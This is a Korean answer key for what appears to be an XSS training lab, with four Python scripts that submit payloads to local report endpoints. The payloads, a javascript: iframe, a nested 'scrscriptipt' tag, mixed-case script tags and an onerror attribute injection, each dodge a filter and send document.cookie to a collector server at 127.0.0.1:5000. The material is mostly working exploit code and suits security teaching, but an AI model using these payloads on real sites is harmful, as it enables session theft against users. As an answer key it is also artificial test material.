# 2. XSS 모범답안

- Lack_of_Validation1
    
    ```python
    import requests
    
    payload = """
    <iframe src="javascript:
        window.open('http://127.0.0.1:5000/?'%2bdocument.cookie);
    ">
    """
    
    data = {
        "url":f"/?html={payload}"
    }
    
    response = requests.post("http://127.0.0.1:30031/report", data=data)
    print(response.text)
    ```
    
    - frame 종류들에 src를 javascript: scheme을 사용하면 상위 페이지에서 js가 작동하는 것으로 감지합니다.
    - on이 필터링되어 location.href 대신 [window.open](http://window.open) 함수를 이용하여 새 탭을 열어서 공격자 서버에 값을 전달할 수 있습니다.
- Inappropriate_Sanitize
    
    ```python
    import requests
    
    data = {
        "url":"""/?html=
        <scrscriptipt>
            window.open("http://127.0.0.1:5000/?"%2bdocument.cookie);
        </scrscriptipt>
        """
    }
    
    response = requests.post("http://127.0.0.1:30032/report", data=data)
    ```
    
- Lack_of_Validation2
    
    ```python
    import requests
    
    payload = """
    <Script>
        window.open("http://127.0.0.1:5000/?"%2bdocument.cookie);
    </scrIpt>
    """
    
    data = {
        "url":f"/?html={payload}"
    }
    
    response = requests.post("http://127.0.0.1:30033/report", data=data)
    print(response.text)
    ```
    
    - 대문자를 필터링하지 않아 html 태그는 대소문자 구분을 하지 않는 특성을 이용하여 우회할 수 있습니다.
- Safe_Renderer
    
    ```python
    import requests
    
    payload = """
    " onerror=location.href='http://127.0.0.1:5000/?'%2bdocument.cookie;
    """
    
    data = {
        "url":f"/image?url={payload}"
    }
    
    response = requests.post("http://127.0.0.1:30034/report", data=data)
    print(response.text)
    ```
    
    - 안전한 함수로 render_template을 사용하려고 했지만, render_template이 자동으로 따옴표를 생성하는 logic에 문제가 있어서 태그 안 attribute를 설정하려고 하면 문제가 생길 수 있습니다.